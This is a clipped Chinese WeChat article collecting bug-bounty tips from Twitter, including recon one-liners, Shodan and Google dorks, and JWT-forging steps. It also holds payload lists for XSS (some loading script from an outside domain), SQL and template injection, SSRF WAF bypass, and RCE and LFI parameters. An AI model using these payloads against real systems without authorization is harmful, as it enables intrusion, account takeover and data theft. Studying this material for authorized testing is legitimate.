---
title: 刷 SRC 自动化赏金技巧第一部分
url: https://mp.weixin.qq.com/s?__biz=Mzg5MDQyMzg3NQ==&mid=2247483727&idx=1&sn=1409142a332f131ed5a2e25c79451583&chksm=cfdd9e63f8aa17757e95a537ca55c9d65e1823a9a73b7ae81021c89ee9615e63351c480dec46&mpshare=1&scene=1&srcid=0313tlUfkWhgNeotYO7OGIkq&sharer_shareinfo=30a0c30b3c7d4d5251b735cc3cd024f2&sharer_shareinfo_first=30a0c30b3c7d4d5251b735cc3cd024f2#rd
clipped_at: 2024-03-13 13:43:01
category: default
tags: 
 - mp.weixin.qq.com
---


# 刷 SRC 自动化赏金技巧第一部分

## 👑 \[自动化赏金技巧系列是什么？👑

主要目标是分享一些更快速的刷 SRC 赏金的自动化挖洞技巧命令和工具协同。使用里面的方法，我们能够快速批量找到可以被利用的子域、api 令牌和其它敏感漏洞。

## 摘要

之前许诺给大家的自动化赏金挖洞技巧，现在来了，我不知道你们现在的挖洞方式是什么？我现在的挖洞方式是能用老外的一条命令自动化或者整合自动化我就不手动挨个去信息收集可以挖掘。希望这个系列可以给你们提供一些不一样的挖洞思路技巧。

## 1\. 心脏滴血漏洞

By: @imranparray101\[1\] Source: link\[2\]

下面是一个有用的一行命令来检查主机名列表中是否存在 OpenSSL Heartbleed 漏洞：

```bash
cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done
```

![图片](assets/1710308581-fa84644bb38c4687ca8706ea0f82560a.png)

请注意， Heartbleed\[3\] （CVE-2014-0160）会导致服务器内存内容泄漏和敏感信息泄漏。

## 2\. 使用 grep 提取 urls

By: @imranparray101\[4\] Source: link\[5\]

```bash
cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*

curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

grep '-Eo' 参数将只打印匹配的行。这将使每个 URL 在一行中逐一打印出来：

![图片](assets/1710308581-d6ae935d447bbcc7d30f35e926fcb836.png)  

## 3\. 从 APK 中提取敏感信息

By: @MrR0Y4L3\[6\] Source: link\[7\]

以下是从未打包的 APK 文件（Android 应用程序）中提取有趣（潜在敏感）信息的提示：:

```bash
grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
```

通过这一行程序，我们可以识别 url、API 密钥、身份验证令牌、凭证、证书锁定代码等等。

请确保首先使用如下 apktool 解压缩 APK 文件：

```bash
apktool d app_name.apk
```

## 4\. 远程解压缩 zip 文件

By @el\_vampinio\[8\] Source: link\[9\]

你是否发现一个可以在远程 web 服务器上访问的非常大的 zip 文件，并希望检查其内容，但您不想等待下载它？用它没毛病..

```bash
pip install remotezip

# 列出远程 zip 文件的内容
remotezip -l "http://site/bigfile.zip"

# 从远程 zip 文件解压出 file.txt
remotezip "http://site/bigfile.zip" "file.txt"
```

Note that for this to work, the remote web server hosting the zip file has to support the range\[10\] HTTP header.

## 5\. Top 25 开放重定向的 dorks

By @lutfumertceylan\[11\] Source: link\[12\]

下面是 25 个最容易发现开放重定向漏洞（"未验证的重定向和转发"）：

```bash
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```

当 URL 参数（payload）在服务器端没有得到正确的验证，导致用户被重定向到一个任意网站时，网站就会受到 Open Redirect 的攻击。

虽然这对用户没有任何重大的威胁，但这个漏洞让网络钓鱼变得更加容易。

## 6\. JWT token 绕过

By @HackerHumble\[13\] Source: link1\[14\], link2\[15\], link3\[16\]

这里有 3 个绕过 JWT 令牌身份验证的技巧。

Tip #1:

1. 捕获 JWT.2. 修改 algorithm 为 None.3. 在正文中用任何你想要的内容改变原本的内容，如.: email: attacker@gmail.com\[17\]4. 使用修改后的令牌发送请求并检查结果。

Tip #2:

1. 捕获 JWT token.2. 如果算法是 RS256，就改成 HS256，然后用公钥签名（你可以通过访问 jwks Uri 来获得，大多数情况下是网站 https 证书的公钥）。3. 使用修改后的令牌发送请求并检查响应。4. 如果后端没有算法检查，你可以奥力给交洞了

Tip #3: 检查服务器端会话终止是否正确 (OTG-SESS-006\[18\]):

1. 检查应用程序是否使用 JWT 令牌进行认证。2. 如果是，登录到应用程序并捕获令牌。(大多数网络应用都会将令牌存储在浏览器的本地存储中)3. 现在注销应用程序。4. 现在用之前捕获的令牌向权限接口发出请求。5. 有时，请求会成功，因为 Web 应用程序只是从浏览器中删除令牌，而不会在后端将令牌列入黑名单。

## 7\. 子域名发现

By @TobiunddasMoe\[19\] Source: link\[20\]

下面是一个快速和基本的侦察程序：

```bash
#!/bin/bash
# $1 => example.domain

amass enum --passive -d $1 -o domains_$1
assetfinder --subs-only $1 | tee -a domains_$1

subfinder -d $1 -o domains_subfinder_$1
cat domains_subfinder_$1 | tee -a domains_$1

sort -u domains_$1 -o domains_$1
cat domains_$1 | filter-resolved | tee -a domains_$1.txt
```

为了实现这一点，我们必须安装一些额外的工具：

•https://github.com/OWASP/Amass•https://github.com/tomnomnom/assetfinder•https://github.com/projectdiscovery/subfinder•https://github.com/tomnomnom/hacks/tree/master/filter-resolved

## 8\. Curl + parallel one-liner

By @akita\_zen\[21\] Source: link\[22\]

这里有一个超级有用的信息收集一行命令，可以快速验证主机名和子域的列表：

```bash
cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```

这一行程序将并行生成 50 个 curl 实例，并以漂亮的方式显示每个主机的 HTTP 状态代码和响应大小（以字节为单位）:

![图片](assets/1710308581-4d89413957f8914082d0dce38803b0fd.png)  

请先安装下面的工具：

```bash
apt-get -y install parallel
```

## 9\. 简易 xss 漏洞检测

By @TobiunddasMoe\[23\] Source: link\[24\]

查看这个 shell 脚本，使用多个开源工具串联起来识别 XSS（跨站脚本）漏洞。:

```bash
#!/bin/bash
# $1 => example.domain

subfinder -d $1 -o domains_subfinder_$1
amass enum --passive -d $1 -o domains_$1

cat domains_subfinder_$1 | tee -a domain_$1
cat domains_$1 | filter-resolved | tee -a domains_$1.txt

cat domains_$1.txt | ~/go/bin/httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss | tee xss.txt
```

这是另一个需要安装多个附加工具的组合：

•https://github.com/projectdiscovery/subfinder•https://github.com/OWASP/Amass•https://github.com/tomnomnom/hacks/tree/master/filter-resolved•https://github.com/tomnomnom/httprobe•https://github.com/tomnomnom/waybackurls•https://github.com/tomnomnom/hacks/tree/master/kxss

## 10\. 在 Burp Suite 过滤垃圾的包

By @sw33tLie\[25\] Source: link\[26\]

在使用 Burp Suite 进行测试时，您可能希望将这些模式添加到 Burp Suite>Proxy>Options>TLS Pass Through settings 中：

![图片](assets/1710308581-eaa73a67fc818fad2087545ba04f18a9.png)  

```bash
.*\.google\.com
.*\.gstatic\.com
.*\.googleapis\.com
.*\.pki\.goog
.*\.mozilla\..*
```

现在，所有连接到这些主机的底层连接将直接绕过他们，而不通过代理。

在我们的代理日志中没有更多的垃圾包！

## 11\. 使用 SecurityTrails API 发现子域名

By @IfrahIman\_\[27\] Source: link\[28\]

```bash
curl -s --request GET --url https://api.securitytrails.com/v1/domain/target.com/subdomains?apikey=API_KEY | jq '.subdomains[]' | sed 's/\"//g' >test.txt 2>/dev/null && sed "s/$/.target.com/" test.txt | sed 's/ //g' && rm test.txt
```

![图片](assets/1710308581-a04138ec3e00fdefd35f24e0184c17f0.png)  

请注意，要使其正常工作，我们需要一个 SecurityTrails API 密钥。我们可以得到一个免费帐户，每月提供 50 个 API 查询。

## 12\. 访问隐藏的注册页

By @thibeault\_chenu\[29\] Source: link\[30\]

有时候，开发者认为隐藏一个按钮就够了。试着访问以下注册 URI。

| **注册 URI** | **CMS 平台** |
| --- | --- |
| /register | Laravel |
| /user/register | Drupal |
| /wp-login.php?action=register | WordPress |
| /register | eZ Publish |

我们很有可能注册一个新用户并访问 web 应用程序的特权区域，或者至少在其中找到一个立足点。

## 13\. Top 5 Google dorks 语法

By @JacksonHHax\[31\] Source: link\[32\]

```bash
inurl:example.com intitle:"index of"
inurl:example.com intitle:"index of /" "*key.pem"
inurl:example.com ext:log
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
```

通过 Google dorks 在寻找开放目录列表、日志文件、私钥、电子表格、数据库文件和其他有趣的数据。

小贴士：当你在这里的时候，也可以看看谷歌黑客数据库 \[33\](在 exploit-db.com\[34\])，找到更多的 dorks!

## 14\. 在 Drupal 上查找隐藏页面

By @adrien\_jeanneau\[35\] Source: link\[36\]

如果你在 Drupal 网站上搜索，用 Burp Suite Intruder（或任何其他类似的工具）对 '/node/$' 进行模糊处理，其中 '$' 是一个数字（从 1 到 500）。比如说："/node/$"。

•https://target.com/node/1•https://target.com/node/2•https://target.com/node/3•…•https://target.com/node/499•https://target.com/node/500

我们有可能会发现隐藏的页面（测试、开发），这些页面不被搜索引擎引用。

## 15\. 用 gf 查找敏感信息

By @dwisiswant0\[37\] Source: link\[38\]

使用 @dwiswant0\[39\] 收集的特殊 gf-secrets\[40\] 模式查找敏感信息泄露。下面是如何使用它们。

```bash
# Search for testing point with gau and fff
gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
sort -u urls.txt | fff -s 200 -o out/

# After we save responses from known URLs, it's time to dig for secrets
for i in `gf -list`; do [[ ${i} =~ "_secrets"* ]] && gf ${i}; done
```

为了使这个组合工作，我们必须安装以下额外的工具，非常有用，不仅仅是对赏金猎人。

•https://github.com/lc/gau•https://github.com/tomnomnom/fff•https://github.com/tomnomnom/gf•The patterns: https://github.com/dwisiswant0/gf-secrets

## 16\. 用 Shodan 查找 Spring Boot 服务器

By @sw33tLie\[41\] Source: link\[42\]

在 Shodan\[43\] 中搜索以下 favicon 哈希，以查找部署在目标组织中的 Spring Boot 服务器。

```bash
org:你的目标 http.favicon.hash:116323821
```

然后检查是否有暴露的执行器。如果 /env 是可用的，你可能可以实现 RCE。如果 /heapdump 可以访问，你可能会发现私钥和令牌。

如果你对 Spring Boot 技术不熟悉，不要担心。这里有一个快速的指导 101。Spring Boot\[44\] 是一个基于 Java 的开源框架，用于构建基于微服务概念的独立的 spring 应用。

Spring Boot Actuator\[45\] 是一种使用 Web 界面与它们交互的机制。它们通常被映射到 URL，如：

•https://target.com/env•https://target.com/heapdump•etc.

这是一个示列的 /env actuator:

![图片](assets/1710308581-fb867c025ea623258c4684a61e2098b8.png)  

专业提示：检查所有这些 \[46\] 默认的内置执行器。其中一些可能会被暴露并包含有趣的信息。

## 17\. 备份数据库扫描字典

By @TobiunddasMoe\[47\] Source: link\[48\]

```bash
/back.sql
/backup.sql
/accounts.sql
/backups.sql
/clients.sql
/customers.sql
/data.sql
/database.sql
/database.sqlite
/users.sql
/db.sql
/db.sqlite
/db_backup.sql
/dbase.sql
/dbdump.sql
setup.sql
sqldump.sql
/dump.sql
/mysql.sql
/sql.sql
/temp.sql
```

旧的数据库备份可能包含各种有趣的信息 — 用户凭据、配置设置、机密和 api 密钥、客户数据等等。

## 18\. 电子邮件地址 payloads

By @securinti\[49\]) Source: link\[50\]

下面的 payloads 都是有效的电子邮件地址，我们可以用来对基于网络的电子邮件系统进行测试。

XSS (Cross-Site Scripting):

```bash
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```

模板注入：

```bash
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com
```

SQL 注入：

```bash
"' OR 1=1 -- '"@example.com
"mail'); DROP TABLE users;--"@example.com
```

SSRF (Server-Side Request Forgery):

```bash
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
```

参数污染：

```bash
victim&email=attacker@example.com
```

(Email) 头注入：

```bash
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
```

This is pure gold!

## 19\. 从员工 offers 到身份证

By @silentbronco\[51\] Source: link\[52\]

注册成为一名员工会要求员工提供私人优惠，并最终获得一张“身份证”

Here’s what @silentbronco\[53\] did exactly:

1.

搜索目标 ' 的员工在谷歌上的 offers。

```bash
inurl: "目标名称" offers
```

2.

找到向**目标**提供 offers 的网站。

3.

发现 offers 只限于员工。

4.

试着在 " **员工 ID**" 栏中用随机数注册。

5.

因未验证 " **员工证** "，成功注册为员工。

6.

注册为员工后，导致私自报价索赔。

7.

网站还提供了 " **身份证** "，可以用来证明我们是 \*\* 目标的合法员工。

  

  

  

下一次当你在为进入一个组织而苦恼的时候，可以尝试寻找他们的员工 offers，比如 \[@沉默的布朗科\]（https://twitter.com/silentbronco）。

## 20\. 与 Shodan 一起寻找 RocketMQ 控制台

By @debangshu\_kundu\[54\] Source: link\[55\]

这里又是一个小 shodan\[56\]dorks，这次要调出 RocketMQ 控制台，它经常有相当机密的生产信息披露。

```bash
org:target.com http.title:rocketmq-console
```

例如，从暴露的 RocketMQ 控制台中，我们可以发现。

• 额外的主机名和子域 • 内部 IP 地址 • 日志文件位置 • 版本详情 • 等。

下面是一个暴露的 RocketMQ 的例子。

![图片](assets/1710308581-1d4cd1eebde1e5d71eaaf8d27782273e.png)  

## 21\. HTTP 接受头修改

By @jae\_hak99\[57\] Source: link\[58\]

这里有一个小窍门，可以通过改变 Accept 头来发现一些 Web 服务器的信息泄露漏洞。

```bash
Accept: application/json, text/javascript, */*; q=0.01
```

一些有漏洞的 Web 服务器可能会泄露服务器版本信息、堆栈和路由信息。

## 22\. HTTP 主机头：localhost

By @hacker\_\[59\]) Source: link\[60\]

想通过改变一个 header 来发现关键的 bug 吗？就像 @hacker\_\[61\] 一样，在你的下一个目录中把 'Host' 头设置为 'localhost'，结果可能会让你大吃一惊。你可能会获得访问权限。

• 特殊功能 • 内部端点 • 配置文件、SSL 密钥 • 目录列表，...

我们甚至可以更进一步，尝试通过执行虚拟主机枚举来识别所有托管在目标 Web 服务器上的网站。如何枚举虚拟主机？我们可以使用这样的工具。

•https://github.com/ffuf/ffuf•https://nmap.org/nsedoc/scripts/http-vhosts.html•https://github.com/jobertabma/virtual-host-discovery

请注意，我们也可以使用 curl 或 wget：

```bash
curl -v -H "Host: localhost" https://target/
wget -d --header="Host: localhost" https://target/
```

## 23\. XSS 的 Javascript polyglot

By @s0md3v\[62\]) Source: link\[63\]

如何制作 XSS 的 Javascript polyglot？请看这个超级有用的信息图表，它是由 @s0md3v\[64\]:

![图片](assets/1710308581-e357168504e113703eef802af9ac3623.png)  

这是一个 ASCII 码版本。

```bash
-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>

-->          Breaks comment context
'            Breaks Attribute Context
"            Breaks attribute context
/>           Closes an open tag
</sCript>    Breaks JS context
<deTailS     A less known tag
open         To eliminate user interaction required for execution
x            Dummy attribute
">"          Mimics the closing of tag
ontoggle     A less known event handler
()           Parentheses around the function
co\u006efirm "confirm" function with Unicoded 'n'
``           Backticks instead of ()
```

注意，根据我们的情况，我们可能只需要某一部分。不要盲目复制粘贴。

## 24\. 通过 favicon 哈希查找相关域

By @m4ll0k2\[65\] Source: link\[66\]

你知道吗，我们可以通过寻找相同的 favicon 图标哈希值来找到与目标相关的域名和子域名？这正是 @m4ll0k2 所做的 favihash.py 工具的作用。下面是它的使用方法。

```bash
cat my_targets.txt | xargs -I %% bash -c 'echo "http://%%/favicon.ico"' > targets.txt
python3 favihash.py -f https://target/favicon.ico -t targets.txt -s
```

![图片](assets/1710308581-dfece10fa578fa649ac6cbbb7cd63bd4.png)  

简单地说，favihash 将允许我们发现与我们的目标域名具有相同的 favicon 图标哈希。从这里抓取这个工具。

•https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/favihash.py

## 25\. 账户接管通过 JWT token forging

By @\_mkahmad\[67\] Source: link\[68\]

以下是 @\_mkahmad\[69\] 是如何通过伪造 JWT 令牌来接管一个账户的。

•

Decompiled APK and found API endpoint: 解压 APK 并发现 API 端点

> /signup/users/generateJwtToken

•

Sent to repeater (Burp Suite)

•

在请求中添加了 Auth-Token 头。

•

在标题中使用了我的账户的认证码。

•

移除签名部分 -> 成功了！

•

在 Burp Suite 中使用 JOSEPH 改变了 token 中的用户 ID。

•

在响应中得到了其他用户的 JWT 标记。

•

帐户接管！

  

  

  

请注意，所有其他端点都在正确检查 JWT 令牌。

## 26\. Top 25 远程代码执行 (RCE) 参数

By @trbughunters\[70\] Source: link\[71\]

```bash
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

只要你看到这些参数，就要注意了。你有可能会以某种方式在其中注入代码。

## 27\. SSRF payloads 去绕过 WAF

By @manas\_hunter\[72\] Source: link\[73\]

以下是 5 种有效 payloads，当涉及到 SSRF（服务器端请求伪造）时，可用于绕过 WAF

1) 使用 CIDR 绕过 SSRF:

```bash
http://127.127.127.127
http://127.0.0.0
```

2) 使用罕见地址绕过：

```bash
http://127.1
http://0
```

3) 使用技巧组合绕过：

```bash
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib : 3.3.3.3
```

4) 绕过弱解析器：

```bash
http://127.1.1.1:80\@127.2.2.2:80/
```

5) 使用 localhost with \[::\] 绕过：

```bash
http://[::]:80/
http://0000::1:80/
```

1.

什么是 SSRF 漏洞，我们可以用它们来做什么。一般来说，SSRF 允许我们

• 访问在远程服务器上运行的环回接口上的服务。• 扫描内部网络，并与发现的服务进行潜在的交互。• 使用 file:// 协议处理程序读取服务器上的本地文件。• 横向移动 / 转入内部环境。

如何找到 SSRF？当目标网络应用程序允许我们访问外部资源时，例如从外部 URL 加载的配置文件图像（在第三方网站上运行），我们可以尝试加载易受攻击的网络应用程序所访问的内部资源。例如，我们可以

1. 我们发现下面的 URL 可以使用。 `https://example.com:8000/page?user=&link=https://127.0.0.1:8000`2. 然后我们可以运行 Intruder 攻击（Burp Suite），尝试不同的端口，有效地对主机进行端口扫描。3. 我们也可以尝试扫描 192.168.x.x 等私有 IP，发现内部网络中的活 IP。

  

## 28\. 使用 RapidDNS 发现子域名

By @Verry\_\_D\[74\] Source: link\[75\]

在您的.bash\_profile 中添加这个小函数，以使用 RapidDNS\[76\]API 快速查找子域名。

```bash
rapiddns(){
curl -s "https://rapiddns.io/subdomain/$1?full=1" \
 | grep -oP '_blank">\K[^<]*' \
 | grep -v http \
 | sort -u
}
```

我们就可以这样使用。

```bash
rapiddns target.com
```

![图片](assets/1710308581-ff31c3920e108b8c2050910eb3f63028.png)  

很好，也很快。

## 29\. Top 10 你能在什么情况下，你上传能挖到不同的洞

By @SalahHasoneh1\[77\] Source: link\[78\]

以下是上传的十大列表，你可以通过上传来实现这些类型漏洞。

1.**ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE2.**SVG**: 存储 XSS / SSRF / XXE3.**GIF**: 存储 XSS / SSRF4.**CSV**: CSV 注入 5.**XML**: XXE6.**AVI**: LFI / SSRF7.**HTML / JS** : HTML 注入 / XSS / 开放重定向 8.**PNG / JPEG**: 像素洪水攻击 (DoS)9.**ZIP**: RCE via LFI / DoS10.**PDF / PPTX**: SSRF / 盲打 XXE

## 30\. Tiny 最小 XSS 有效 payloads

By @terjanq\[79\] Source: link\[80\]

这是 @terjanq\[81\] 制作的最小 XSS 有效 payloads 的集合。

```bash
<!-- If number of iframes on the page is constant -->
<iframe/onload=src=top[0].name+/\Ǌ.₨?/>

<!-- If number of iframes on the page is random -->
<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>

<!-- If unsafe-inline is disabled in CSP and external scripts allowed -->
<iframe/srcdoc="<script/src=//Ǌ.₨></script>">

<!-- Just a casual script -->
<script/src=//Ǌ.₨></script>

<!-- If you control the name of the window -->
<iframe/onload=src=top.name>

<!-- If you control the name, will work on Firefox in any context, will fail in chromium in DOM -->
<svg/onload=eval(name)>

<!-- If you control the URL -->
<svg/onload=eval(`'`+URL)>
```

需要注意的是，其中一些 XSS 有效 payloads 包含 'Ǌ.₨'unicode 字符串。这是一个目前由 @terjanq\[82\] 拥有的域名 (nj.rs)，其 web 服务器提供的 PoC 代码会在 XSS 条件下触发警报。

![图片](assets/1710308581-8f421dab47de07774751d5f60914b4d7.png)  

这使得 XSS 有效 payloads 非常小。

更多 XSS 有效 payloads 和 DEMO 页面，请查看他指定的 Github 仓库。

•https://github.com/terjanq/Tiny-XSS-Payloads

## 31\. Top 25 本地文件包含 (LFI) 参数

By @trbughunters\[83\] Source: link\[84\]

以下是易受本地文件包含（LFI）漏洞攻击的 top 25 个参数的列表：

```bash
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

只要你看到这些参数，就要注意了。有可能你会发现 LFI 的漏洞。

## 32\. GIT 和 SVN 文件的 fuzz 列表

By @TobiunddasMoe\[85\] Source: link\[86\]

这里有一个快速的小技巧，使用这个小而快的 fuzz 列表来查找 git 和 svn 文件。

```bash
/.git
/.git-rewrite
/.git/HEAD
/.git/config
/.git/index
/.git/logs/
/.git_release
/.gitattributes
/.gitconfig
/.gitignore
/.gitk
/.gitkeep
/.gitmodules
/.gitreview
/.svn
/.svn/entries
/.svnignore
```

我们可能会在其中找到一些有趣的信息。

## 33\. 镜像网站目录结构

By @2RS3C\[87\] Source: link\[88\]

发现类似的目录列表？

![图片](assets/1710308581-33bc0c03c48197bcfd6dc5b001429290.png)  

使用下面的 'wget' 命令循环获取所有文件（+ 结构）到你的机器。

```bash
wget -r --no-pare target.com/dir.
```

现在你可以查看文件中的结构，搜索和 grep。

小贴士：如何查找目标的目录列表？目录列表是 Web 服务器的错误配置，我们可以用这些来识别。

•Google dorks•Shodan\[89\] search engine•https://github.com/ffuf/ffuf•https://github.com/maurosoria/dirsearch

## 34\. 使用 AlienVault OTX 查找敏感信息

By @mariusshoratau\[90\] Source: link\[91\]

•

你听说过 AlienVault Open Threat Exchange\[92\] (OTX) 吗？你可以用它来轻松获得赏金。下面就来介绍一下吧。

1. 前往 https://otx.alienvault.com/indicator/domain/。2. 用你的目标替换。3. 向下滚动到 "关联的 URLs" 部分。4. 使用 AlientVault OTX，您可能会发现披露其他用户的敏感信息（如收据）、认证令牌、IDOR、有趣的参数 / 文件以及许多其他有用的 URL。

需要注意的是，还有 API 可以在

•https://otx.alienvault.com/api/v1/indicators/domain//url\_list?limit=100&page=1。

  

所以，我们可以这样做。

```bash
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq
```

![图片](assets/1710308581-634ee05a930d3210f566b5990949e2f9.png)  

要想只得到 URL 的列表，我们可以这样做。

```bash
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq -r '.url_list[].url'
```

![图片](assets/1710308581-bde6d93d850dc4dad7fe78f5c5aae27b.png)  

### References  

`[1]` @imranparray101: *https://twitter.com/imranparray101*  
`[2]` link: *https://twitter.com/imranparray101/status/1275348849079406594*  
`[3]` Heartbleed: *https://heartbleed.com/*  
`[4]` @imranparray101: *https://twitter.com/imranparray101*  
`[5]` link: *https://twitter.com/imranparray101/status/1274344698547539970*  
`[6]` @MrR0Y4L3: *https://twitter.com/MrR0Y4L3*  
`[7]` link: *https://twitter.com/MrR0Y4L3/status/1272982285277491200*  
`[8]` @el\_vampinio: *https://twitter.com/el\_vampinio*  
`[9]` link: *https://twitter.com/el\_vampinio/status/1273517999954280448*  
`[10]` range: *https://developer.mozilla.org/en-US/docs/Web/HTTP/Range\_requests*  
`[11]` @lutfumertceylan: *https://twitter.com/lutfumertceylan*  
`[12]` link: *https://twitter.com/lutfumertceylan/status/1272895185031217152*  
`[13]` @HackerHumble: *https://twitter.com/HackerHumble*  
`[14]` link1: *https://twitter.com/HackerHumble/status/1274313774111920128*  
`[15]` link2: *https://twitter.com/HackerHumble/status/1274314917907030017*  
`[16]` link3: *https://twitter.com/HackerHumble/status/1274315932119097344*  
`[17]` attacker@gmail.com: *mailto:attacker@gmail.com*  
`[18]` OTG-SESS-006: *https://wiki.owasp.org/index.php/Testing\_for\_logout\_functionality\_(OTG-SESS-006)*  
`[19]` @TobiunddasMoe: *https://twitter.com/TobiunddasMoe*  
`[20]` link: *https://twitter.com/TobiunddasMoe/status/1275130179870961664*  
`[21]` @akita\_zen: *https://twitter.com/akita\_zen*  
`[22]` link: *https://twitter.com/akita\_zen/status/1269473525930360832*  
`[23]` @TobiunddasMoe: *https://twitter.com/TobiunddasMoe*  
`[24]` link: *https://twitter.com/TobiunddasMoe/status/1273941442117996544*  
`[25]` @sw33tLie: *https://twitter.com/sw33tLie*  
`[26]` link: *https://twitter.com/sw33tLie/status/1275537548539027457*  
`[27]` @IfrahIman\_: *https://twitter.com/IfrahIman\_*  
`[28]` link: *https://twitter.com/IfrahIman\_/status/1274513935039967233*  
`[29]` @thibeault\_chenu: *https://twitter.com/thibeault\_chenu*  
`[30]` link: *https://twitter.com/thibeault\_chenu/status/1273987874430554112*  
`[31]` @JacksonHHax: *https://twitter.com/JacksonHHax*  
`[32]` link: *https://twitter.com/JacksonHHax/status/1273959927321509890*  
`[33]` 谷歌黑客数据库: *https://www.exploit-db.com/google-hacking-database*  
`[34]` exploit-db.com: *https://www.exploit-db.com/*  
`[35]` @adrien\_jeanneau: *https://twitter.com/adrien\_jeanneau/status/1273952564430725123*  
`[36]` link: *https://twitter.com/adrien\_jeanneau/status/1273952564430725123*  
`[37]` @dwisiswant0: *https://twitter.com/dwisiswant0*  
`[38]` link: *https://twitter.com/dwisiswant0/status/1276402773039304704*  
`[39]` @dwiswant0: *https://twitter.com/dwisiswant0*  
`[40]` gf-secrets: *https://github.com/dwisiswant0/gf-secrets*  
`[41]` @sw33tLie: *https://twitter.com/sw33tLie*  
`[42]` link: *https://twitter.com/sw33tLie/status/1276266817053392900*  
`[43]` Shodan: *https://www.shodan.io/*  
`[44]` Spring Boot: *https://spring.io/guides/gs/spring-boot/*  
`[45]` Spring Boot Actuator: *https://spring.io/guides/gs/actuator-service/*  
`[46]` 这些: *https://docs.spring.io/spring-boot/docs/current/reference/htmlsingle/#production-ready-endpoints-exposing-endpoints*  
`[47]` @TobiunddasMoe: *https://twitter.com/TobiunddasMoe*  
`[48]` link: *https://twitter.com/TobiunddasMoe/status/1276217343073370113*  
`[49]` compiled by \[@intigriti\](https://twitter.com/intigriti: *https://twitter.com/securinti*  
`[50]` link: *https://twitter.com/intigriti/status/1272860780694843392*  
`[51]` @silentbronco: *https://twitter.com/silentbronco*  
`[52]` link: *https://twitter.com/silentbronco/status/1276941262843637761*  
`[53]` @silentbronco: *https://twitter.com/silentbronco*  
`[54]` @debangshu\_kundu: *https://twitter.com/debangshu\_kundu*  
`[55]` link: *https://twitter.com/debangshu\_kundu/status/1276434960241397761*  
`[56]` shodan: *https://www.shodan.io/*  
`[57]` @jae\_hak99: *https://twitter.com/jae\_hak99*  
`[58]` link: *https://twitter.com/jae\_hak99/status/1277222157366358017*  
`[59]` compiled by \[@intigriti\](https://twitter.com/intigriti: *https://twitter.com/hacker\_*  
`[60]` link: *https://twitter.com/intigriti/status/1284461734108057601*  
`[61]` @hacker\_: *https://twitter.com/hacker\_*  
`[62]` tweeted by \[@lutfumertcey\](https://twitter.com/lutfumertcey: *https://twitter.com/s0md3v*  
`[63]` link: *https://twitter.com/lutfumertceylan/status/1284078795754999808*  
`[64]` @s0md3v: *https://twitter.com/s0md3v*  
`[65]` @m4ll0k2: *https://twitter.com/m4ll0k2*  
`[66]` link: *https://twitter.com/m4ll0k2/status/1279402680704806912*  
`[67]` @\_mkahmad: *https://twitter.com/\_mkahmad*  
`[68]` link: *https://twitter.com/\_mkahmad/status/1268099950828589058*  
`[69]` @\_mkahmad: *https://twitter.com/\_mkahmad*  
`[70]` @trbughunters: *https://twitter.com/trbughunters*  
`[71]` link: *https://twitter.com/trbughunters/status/1283133356922884096*  
`[72]` @manas\_hunter: *https://twitter.com/manas\_hunter*  
`[73]` link: *https://twitter.com/manas\_hunter/status/1282743891154792449*  
`[74]` @Verry\_\_D: *https://twitter.com/Verry\_\_D*  
`[75]` link: *https://twitter.com/Verry\_\_D/status/1282293265597779968*  
`[76]` RapidDNS: *https://rapiddns.io/*  
`[77]` @SalahHasoneh1: *https://twitter.com/SalahHasoneh1*  
`[78]` link: *https://twitter.com/SalahHasoneh1/status/1281274120395685889*  
`[79]` @terjanq: *https://twitter.com/terjanq*  
`[80]` link: *https://twitter.com/terjanq/status/1281371112060968964*  
`[81]` @terjanq: *https://twitter.com/terjanq*  
`[82]` @terjanq: *https://twitter.com/terjanq*  
`[83]` @trbughunters: *https://twitter.com/trbughunters*  
